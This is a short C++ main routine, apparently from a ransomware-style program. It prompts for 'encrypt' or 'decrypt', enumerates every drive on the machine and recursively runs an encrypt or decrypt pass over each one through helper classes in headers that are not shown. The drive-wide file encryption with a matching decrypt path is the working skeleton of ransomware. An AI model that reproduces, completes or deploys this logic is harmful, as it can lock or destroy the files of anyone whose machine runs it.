#include "include/common.h"
#include "include/crypt.h"
#include "include/search.h"


int main() {
	search sc;
	int chs;
	std::cout << "select number to encrypt or decrypt , 1. encrypt , 2. decrypt \n";

	while (true) {
		std::cin >> chs;
		if (chs == 1) {
			sc.getDrive();
			sc.isCSysDir();
			for (int i = 0; i < 30; i++) {
				if (sc.SystemDrive[i] != "") {
					std::filesystem::path path = sc.SystemDrive[i];
					sc.searchInDir(path, true);
				}
			}
		}
		else if (chs == 2) {
			sc.getDrive();
			sc.isCSysDir();
			for (int i = 0; i < 30; i++) {
				if (sc.SystemDrive[i] != "") {
					std::filesystem::path path = sc.SystemDrive[i];
					sc.searchInDir(path, false);
				}
			}
		}
		else {
			break;
		}
	}
	return EXIT_SUCCESS;
}